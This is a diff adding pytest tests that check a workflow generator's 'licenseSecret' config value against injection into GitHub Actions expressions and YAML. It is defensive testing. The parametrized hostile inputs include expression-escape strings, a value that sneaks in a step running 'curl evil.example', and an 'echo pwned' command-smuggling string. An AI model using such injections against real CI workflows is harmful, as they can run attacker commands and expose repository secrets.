@@ -109,3 +109,61 @@ def test_hostile_name_rejected_before_render(tmp_path, hostile_name):
     write_config(tmp_path, {"name": hostile_name})
     with pytest.raises(ConfigError):
         load_config(tmp_path)
+
+
+# --- Assertion 6: licenseSecret cannot smuggle an expression or a YAML break
+#
+# Issue #24 added the ONE config value that is interpolated into an Actions
+# EXPRESSION (`${{ secrets.<NAME> }}`) rather than merely into a quoted YAML
+# scalar, so it gets its own guard at both layers. The whitelist above is
+# deliberately left as-is -- it describes the default output, and assertion 3
+# remains the load-bearing check for that -- while the licensed output has its
+# own, still-closed whitelist here.
+
+LICENSED_WHITELIST_RE = re.compile(
+    r"^\$\{\{\s*secrets\.(GITHUB_TOKEN|GITLEAKS_LICENSE)\s*\}\}$"
+)
+
+
+@pytest.mark.parametrize("hostile_secret", [
+    "${{ github.token }}",
+    "X }} ${{ github.event.issue.title }} ${{ x",   # escape the expression
+    'X" }}\n      - run: curl evil.example\n#',     # escape the YAML scalar
+    "X\"; echo pwned; #",
+    "GITLEAKS_LICENSE\n",
+    "MY-LICENSE",
+    "MY.LICENSE",
+])
+def test_hostile_license_secret_rejected_before_render(tmp_path, hostile_secret):
+    """None of these ever reaches the renderer: the loader refuses them, so
+    there is no rendered output to inspect for damage."""
+    write_config(tmp_path, {"licenseSecret": hostile_secret})
+    with pytest.raises(ConfigError):
+        load_config(tmp_path)
+
+
+def test_licensed_output_contains_only_closed_secret_expressions(tmp_path):
+    """The rendered-output half of the same guarantee: with a licenseSecret
+    configured, every `${{ ... }}` in the workflow is still a bare
+    `secrets.<NAME>` lookup -- never a `github.*` context reference, never a
+    function call, never an unbalanced fragment."""
+    cfg = load_config(write_config(tmp_path, {"licenseSecret": "GITLEAKS_LICENSE"}))
+    output = render(build_plan(cfg))
+    expressions = EXPRESSION_RE.findall(output)
+    assert len(expressions) == 2
+    for expr in expressions:
+        assert LICENSED_WHITELIST_RE.fullmatch(expr), expr
+    assert "github." not in output
+    for block in iter_run_blocks(output):
+        assert "${{" not in block
+
+
+def test_licensed_output_gains_exactly_one_line(tmp_path):
+    """A YAML break smuggled through licenseSecret would show up here as
+    extra structure. It cannot, but the output is counted rather than
+    assumed."""
+    plain = render(build_plan(load_config(write_config(tmp_path, {}))))
+    licensed = render(build_plan(
+        load_config(write_config(tmp_path, {"licenseSecret": "GITLEAKS_LICENSE"}))
+    ))
+    assert len(licensed.splitlines()) == len(plain.splitlines()) + 1
